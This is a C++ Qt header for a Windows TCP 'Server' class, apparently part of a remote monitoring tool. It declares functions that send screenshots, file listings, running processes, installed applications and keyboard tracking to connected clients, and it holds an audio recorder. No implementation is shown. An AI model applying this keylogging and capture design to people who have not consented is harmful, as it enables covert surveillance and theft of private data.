
#ifndef SERVER_H
#define SERVER_H

#include <QObject>
#include <QString>
#include <QList>
#include <QtNetwork>
#include <Windows.h>
#include <iostream>
#include <sstream>

#include <QPixmap>
#include <QFileSystemModel>
#include <QTimer>
#include <QStandardPaths>
#include <QDirIterator>

#include "audiorecorder.h"
#include "fileExplorer.h"
#include "psapi.h"

class Server : public QObject
{
    Q_OBJECT
public:
    explicit Server(QObject *parent = nullptr);
//    ~Server();
signals:
//    void connected();
//    void disconnected();
    void readyRead(const QString &cmdNumber);
    void display(const QPixmap &pic);
    void error(QAbstractSocket::SocketError socketError);

private slots:
    void readMessage();
    void newConnection();
    void disconnected();
//    void processData();
//    void sendProcesses();
public:
//    QTcpServer *getServer();
private:
    void initServer();
    void stream(QTcpSocket* clientConnection);
    void sendMessage(QTcpSocket* clientSocket, const QString &cmdNumber);
    void sendScreenshot(QTcpSocket* clientSocket, const QPixmap &screenshot);
    void sendFileStructure(QTcpSocket* clientSocket, const QStringList &fileStruct);
    void sendProcesses(QTcpSocket* clientSocket);
    void sendKeyboardTrack(QTcpSocket* clientSocket);
    void sendApplications(QTcpSocket* clientSocket, const QStringList &appList);
public:
    QString ipAddress;
    QString port;
private:
    QTcpServer *tcpServer = nullptr;
    QDataStream in;

    QProcess *processKeyboardTrack;
    QProcess *processListProcesses;
    AudioRecorder *recorder = nullptr;
    QList<QTcpSocket*> clients;

    fileExplorer *myFileExplorer = nullptr;

//    HHOOK mouseHook;

//static    LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
//    void startHook();
//    void stopHook();
};

#endif // SERVER_H
